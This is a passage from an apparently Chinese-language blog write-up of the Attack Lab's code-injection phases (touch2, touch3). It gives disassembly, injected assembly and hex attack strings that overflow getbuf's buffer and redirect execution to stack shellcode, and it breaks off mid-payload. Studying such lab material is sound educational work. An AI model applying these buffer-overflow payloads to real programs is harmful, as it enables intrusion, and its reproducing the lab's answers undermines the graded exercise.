+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">f0:</span>	<span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4017</span><span class="nl">f5:</span>	<span class="nf">e8</span> <span class="nv">e6</span> <span class="nv">f5</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">de0</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h4 id="思路-1">思路</h4>
+<p>根据level1中查看的栈情况，我们可以在<code>buf</code>数组（即栈中的空白区）写入攻击代码，再通过“输入溢出“，修改函数跳转后的地址为攻击代码的首地址。</p>
+<p>其中，攻击代码也需要一次<code>ret</code>跳转，于是需要在攻击代码中压栈<code>touch2</code>的首地址。</p>
+<p>已知函数第一个参数存放在寄存器<code>%rdi</code>，而题目要求任何跳转都只能使用<code>ret</code>指令。</p>
+<p>查看<strong>CTARGET</strong>文件，可知<code>touch2</code>的首地址为<code>0x4017a4</code></p>
+<p>于是编写攻击代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">movq</span> <span class="kc">$</span><span class="mh">0x2ded9dc0</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>   <span class="c1">; 设置参数为cookie的值</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pushq</span> <span class="kc">$</span><span class="mh">0x4017a4</span>        <span class="c1">; 将touch2首地址压栈，待ret跳转时使用</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div><aside>
+💡 注意，指令`ret` <=> `pop %rip`，跳转的指令地址是需要从栈中弹出来的，需要在进行`ret`前刚好处在栈顶，在这里需要进行`pushq`操作，而不能简单地在追加到攻击字符串的后面。
+<ul>
+<li>
+<p>错误的攻击代码和字符串：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="kc">$</span><span class="mh">0x2ded9dc0</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>  <span class="c1">; 设置参数为cookie的值</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">c0</span> <span class="mi">9</span><span class="n">d</span> <span class="n">ed</span> <span class="mi">2</span><span class="n">d</span>  <span class="c1">// 将参数寄存器%rdi设置为cookie的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">c3</span>                    <span class="c1">// ret返回
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">a4</span> <span class="mi">17</span> <span class="mi">40</span>              <span class="c1">// touch2的首地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  <span class="c1">// 必须为0，否则会干扰上下文
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>  
+</span></span><span class="line"><span class="cl"><span class="mi">08</span> <span class="mi">49</span> <span class="mi">65</span> <span class="mi">55</span>           <span class="c1">// 修改为攻击代码的首地址，注意应当往高处挤
+</span></span></span></code></pre></div></li>
+</ul>
+</aside>
+<h4 id="栈结构-1">栈结构</h4>
+<p><code>getbuf</code>函数执行<code>ret</code>返回后的栈结构如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/d3e1fd67-afcb-47fd-b9cb-08226c6babd5/Untitled.png" alt="Untitled.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>注意，<code>&amp;(touch2)</code>是执行攻击代码后压栈的，之后<code>rsp</code>将下移8bytes。</p>
+<p>具体而言，<code>getbuf</code>函数返回后将跳转<code>0x55654908</code>执行攻击代码，将<code>&amp;(touch2)</code>压栈；之后执行<code>ret</code>命令，栈弹出<code>&amp;(touch2)</code>，跳转执行函数<code>touch2</code>。</p>
+<aside>
+💡 需要注意，如果地址中包含有字节值`0x0a`，函数`Gets`读取到后会识别为换行符，导致后面的字符串全都丢失；
+为了解决这个问题，我们需要将其转化为两个步骤——先赋值`0x9`，再通过指令`inc`加一得到`0xa`，如：
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="kc">$</span><span class="mh">0x54e16afd</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>
+</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="kc">$</span><span class="mh">0x401809</span><span class="p">,</span><span class="o">%</span><span class="nb">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">inc</span> <span class="o">%</span><span class="nb">rdx</span>  <span class="c1">; 0x40180a</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pushq</span> <span class="o">%</span><span class="nb">rdx</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
+</span></span></code></pre></div></aside>
+<h4 id="解决-1">解决</h4>
+<p>将攻击代码写入文件<code>two.s</code>，之后执行以下命令：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">unix</span><span class="o">&gt;</span> <span class="nv">gcc</span> <span class="o">-</span><span class="nv">c</span> <span class="nv">two.s</span>
+</span></span><span class="line"><span class="cl"><span class="nf">unix</span><span class="o">&gt;</span> <span class="nv">objdump</span> <span class="o">-</span><span class="nv">d</span> <span class="nv">two.o</span> <span class="o">&gt;</span> <span class="nv">two.d</span>
+</span></span></code></pre></div><p>可以得到攻击代码的字节值：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/96c16087-1fd7-4ce8-bc71-747f5c53a10c/%E6%88%AA%E5%B1%8F2023-12-10_20.01.06.png" alt="截屏2023-12-10 20.01.06.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>于是攻击字符串为：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="n">c0</span> <span class="mi">9</span><span class="n">d</span> <span class="n">ed</span> <span class="mi">2</span><span class="n">d</span>  <span class="c1">// 将参数寄存器%rdi设置为cookie的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">68</span> <span class="n">a4</span> <span class="mi">17</span> <span class="mi">40</span> <span class="mo">00</span>        <span class="c1">// 将touch2的首地址压栈
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">c3</span>                    <span class="c1">// ret返回
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> 
+</span></span><span class="line"><span class="cl"><span class="mi">08</span> <span class="mi">49</span> <span class="mi">65</span> <span class="mi">55</span>           <span class="c1">// 攻击代码的首地址，注意应当往高处挤，即之前必须填充满56个字节
+</span></span></span></code></pre></div><p>查看调用<code>Gets</code>前后的栈结构对比如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/fc20a2d7-2a94-43d4-9712-a025dfc8b3d0/%E6%88%AA%E5%B1%8F2023-12-10_16.06.05.png" alt="截屏2023-12-10 16.06.05.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/8a6cd2c0-d94e-4da9-8a3c-3ee927135baa/%E6%88%AA%E5%B1%8F2023-12-10_20.08.55.png" alt="截屏2023-12-10 20.08.55.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>紧跟着往下执行，可以看到程序成功跳转到了攻击代码的首地址，且成功更改寄存器<code>%rdi</code>的值</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/b6e35915-bc86-4da8-a7e7-5d7ead32f39a/%E6%88%AA%E5%B1%8F2023-12-10_20.10.36.png" alt="截屏2023-12-10 20.10.36.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>继续执行，任务完成。</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/d7d5d379-a92b-4c21-b622-45e342d60534/%E6%88%AA%E5%B1%8F2023-12-10_20.11.06.png" alt="截屏2023-12-10 20.11.06.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<hr>
+<h3 id="phase-3-level-3">Phase 3 Level 3</h3>
+<h4 id="任务-2">任务</h4>
+<p>同样是代码注入攻击，要让程序执行<code>touch3</code>而不是返回到<code>test</code>，且执行<code>touch3</code>时传入的参数须为我的<strong>cookie</strong>（char*字符串类型）。</p>
+<ul>
+<li>
+<p><code>hexmatch</code>（C语言）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">hexmatch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">val</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="n">cbuf</span><span class="p">[</span><span class="mi">110</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* Make position of check string unpredictable */</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">char</span> <span class="o">*</span><span class="n">s</span> <span class="o">=</span> <span class="n">cbuf</span> <span class="o">+</span> <span class="nf">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">100</span><span class="p">;</span>     <span class="c1">// s的地址是随机的
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nf">sprintf</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#34;%.8x&#34;</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">strncmp</span><span class="p">(</span><span class="n">sval</span><span class="p">,</span> <span class="n">s</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>touch3</code>（C语言）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">touch3</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">sval</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="n">vlevel</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>       <span class="cm">/* Part of validation protocol */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">hexmatch</span><span class="p">(</span><span class="n">cookie</span><span class="p">,</span> <span class="n">sval</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Touch3!: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Misfire: You called touch3(</span><span class="se">\&#34;</span><span class="s">%s</span><span class="se">\&#34;</span><span class="s">)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">sval</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	 <span class="nf">fail</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>touch3</code>（反汇编）</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="err">0000000000401878</span> <span class="err">&lt;</span><span class="nf">touch3</span><span class="o">&gt;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401878:</span>	<span class="err">53</span>                   	<span class="nf">push</span>   <span class="o">%</span><span class="nb">rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401879:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">fb</span>             	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">rdi</span><span class="p">,</span><span class="o">%</span><span class="nb">rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40187</span><span class="nl">c:</span>	<span class="nf">c7</span> <span class="mi">05</span> <span class="mi">76</span> <span class="mi">3</span><span class="nv">c</span> <span class="mi">20</span> <span class="mi">00</span> <span class="mi">03</span> 	<span class="nv">movl</span>   <span class="kc">$</span><span class="mh">0x3</span><span class="p">,</span><span class="mh">0x203c76</span><span class="p">(</span><span class="o">%</span><span class="nv">rip</span><span class="p">)</span>        <span class="err">##</span> <span class="mi">6054</span><span class="nv">fc</span> <span class="o">&lt;</span><span class="nv">vlevel</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401883:</span>	<span class="err">00</span> <span class="err">00</span> <span class="err">00</span> 
+</span></span><span class="line"><span class="cl">  <span class="err">401886:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">fe</span>             	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">rdi</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401889:</span>	<span class="err">8</span><span class="nf">b</span> <span class="mi">3</span><span class="nv">d</span> <span class="mi">75</span> <span class="mi">3</span><span class="nv">c</span> <span class="mi">20</span> <span class="mi">00</span>    	<span class="nv">mov</span>    <span class="mh">0x203c75</span><span class="p">(</span><span class="o">%</span><span class="nv">rip</span><span class="p">),</span><span class="o">%</span><span class="nb">edi</span>        <span class="err">##</span> <span class="mi">605504</span> <span class="o">&lt;</span><span class="nv">cookie</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40188</span><span class="nl">f:</span>	<span class="nf">e8</span> <span class="mi">66</span> <span class="nv">ff</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">4017</span><span class="nv">fa</span> <span class="o">&lt;</span><span class="nv">hexmatch</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401894:</span>	<span class="err">85</span> <span class="nf">c0</span>                	<span class="nv">test</span>   <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401896:</span>	<span class="err">74</span> <span class="err">1</span><span class="nf">e</span>                	<span class="nv">je</span>     <span class="mi">4018</span><span class="nv">b6</span> <span class="o">&lt;</span><span class="nv">touch3</span><span class="o">+</span><span class="mh">0x3e</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">401898:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">de</span>             	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">rbx</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">40189</span><span class="nl">b:</span>	<span class="nf">bf</span> <span class="mi">48</span> <span class="mi">30</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x403048</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">a0:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">a5:</span>	<span class="nf">e8</span> <span class="nv">d6</span> <span class="nv">f3</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">c80</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">aa:</span>	<span class="nf">bf</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x3</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">af:</span>	<span class="nf">e8</span> <span class="mi">05</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">callq</span>  <span class="mi">401</span><span class="nv">cb9</span> <span class="o">&lt;</span><span class="nv">validate</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">b4:</span>	<span class="nf">eb</span> <span class="mi">1</span><span class="nv">c</span>                	<span class="nv">jmp</span>    <span class="mi">4018</span><span class="nv">d2</span> <span class="o">&lt;</span><span class="nv">touch3</span><span class="o">+</span><span class="mh">0x5a</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">b6:</span>	<span class="err">48</span> <span class="err">89</span> <span class="nf">de</span>             	<span class="nv">mov</span>    <span class="o">%</span><span class="nb">rbx</span><span class="p">,</span><span class="o">%</span><span class="nb">rsi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">b9:</span>	<span class="nf">bf</span> <span class="mi">70</span> <span class="mi">30</span> <span class="mi">40</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x403070</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">be:</span>	<span class="nf">b8</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">c3:</span>	<span class="nf">e8</span> <span class="nv">b8</span> <span class="nv">f3</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">c80</span> <span class="o">&lt;</span><span class="nv">printf@plt</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">c8:</span>	<span class="nf">bf</span> <span class="mi">03</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x3</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">cd:</span>	<span class="nf">e8</span> <span class="mi">99</span> <span class="mi">04</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">callq</span>  <span class="mi">401</span><span class="nv">d6b</span> <span class="o">&lt;</span><span class="nv">fail</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">d2:</span>	<span class="nf">bf</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span> <span class="mi">00</span>       	<span class="nv">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">edi</span>
+</span></span><span class="line"><span class="cl">  <span class="err">4018</span><span class="nl">d7:</span>	<span class="nf">e8</span> <span class="mi">04</span> <span class="nv">f5</span> <span class="nv">ff</span> <span class="nv">ff</span>       	<span class="nv">callq</span>  <span class="mi">400</span><span class="nv">de0</span> <span class="o">&lt;</span><span class="nv">exit@plt</span><span class="o">&gt;</span>
+</span></span></code></pre></div></li>
+</ul>
+<h4 id="思路-2">思路</h4>
+<p>思路依旧是通过函数<code>Gets</code>向（<code>getbuf</code>的）栈中写入攻击代码，但由于参数需要是char*类型，我们还需要考虑字符串形式的<strong>cookie</strong>存在哪里。</p>
+<p>重新捋一下函数调用关系——</p>
+<ol>
+<li><code>test</code>调用 <code>getbuf</code> ；</li>
+<li>执行时，<code>getbuf</code>栈桢被修改，执行一段攻击代码，之后返回到<code>touch3</code>的首地址，回收栈桢；</li>
+<li><code>touch3</code>调用<code>hexmatch</code>。</li>
+</ol>
+<p>因此栈中总共的栈桢变化为：<code>test</code>+<code>getbuf</code>（修改）→ <code>test</code>+<code>hexmatch</code></p>
+<p>在<code>hexmatch</code>栈桢中，局部变量s的地址是随机的，而且还调用了函数<code>strncmp</code>，将<strong>cookie</strong>存在原先的<code>getbuf</code>栈桢中会有被覆盖的风险；故考虑将<strong>cookie</strong>存入父函数<code>test</code>的栈桢中。</p>
+<p>让我们先看看<code>test</code>的栈桢，将断点打在调用<code>getbuf</code>之前，可知此时栈指针为<code>0x55654948</code>、指向了一段可用的8字节空间，刚好能够用来存<strong>cookie</strong>。</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/16378043-d69a-41c0-99e2-ce178c3ee2dd/%E6%88%AA%E5%B1%8F2023-12-10_22.13.46.png" alt="截屏2023-12-10 22.13.46.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>可知<code>touch3</code>的首地址为<code>0x401878</code>，于是攻击代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">movq</span> <span class="kc">$</span><span class="mh">0x55654948</span><span class="p">,</span><span class="o">%</span><span class="nb">rdi</span>  <span class="c1">; 设置参数为cookie字符串的首地址</span>
+</span></span><span class="line"><span class="cl"><span class="nf">pushq</span> <span class="kc">$</span><span class="mh">0x401878</span>        <span class="c1">; 压栈touch3的首地址</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ret</span>                    <span class="c1">; 返回，跳转touch3</span>
+</span></span></code></pre></div><p>又可知<strong>cookie</strong>（<code>0x2ded9dc0</code>）的ASCII码字节值为：<code>32 64 65 64 39 64 63 30</code></p>
+<h4 id="栈结构-2">栈结构</h4>
+<p><code>getbuf</code>函数执行<code>ret</code>返回后的栈结构如下：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/475ecf56-d044-438f-b2bd-3fca2bbdb27c/Untitled.png" alt="Untitled.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>注意，<code>&amp;(touch3)</code>是执行攻击代码后才压栈的，压栈后<code>rsp</code>将下移8字节。</p>
+<p>具体而言，<code>getbuf</code>函数执行<code>ret</code>后弹出返回地址<code>0x55654908</code>（攻击代码的首地址）并跳转执行攻击代码，在执行<code>pushq</code>时将<code>touch3</code>的首地址压栈，最后执行<code>ret</code>将其弹出，跳转执行函数<code>touch3</code>。</p>
+<h4 id="解决-2">解决</h4>
+<p>查看攻击代码的字节值：</p>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure  >
+  <div class="flex justify-center	">
+    <div class="w-100" ><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/3aee0da3-5022-4762-b657-ee960b3be54c/2fc7b360-5691-4612-806e-34c849b012d2/%E6%88%AA%E5%B1%8F2023-12-10_22.49.41.png" alt="截屏2023-12-10 22.49.41.png" loading="lazy" data-zoomable /></div>
+  </div></figure>
+</p>
+<p>于是可构建攻击字符串：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mi">48</span> <span class="n">c7</span> <span class="n">c7</span> <span class="mi">48</span> <span class="mi">49</span> <span class="mi">65</span> <span class="mi">55</span>     <span class="c1">// 将参数rdi设置为cookie字符串的首地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">68</span> <span class="mi">78</span> <span class="mi">18</span> <span class="mi">40</span> <span class="mo">00</span>           <span class="c1">// 将touch3地址压栈
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">c3</span>                       <span class="c1">// 返回，调用touch3函数 13
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="o">****</span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="o">****</span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
+</span></span><span class="line"><span class="cl"><span class="o">****</span><span class="mo">00</span> <span class="mo">00</span> <span class="mo">00</span>
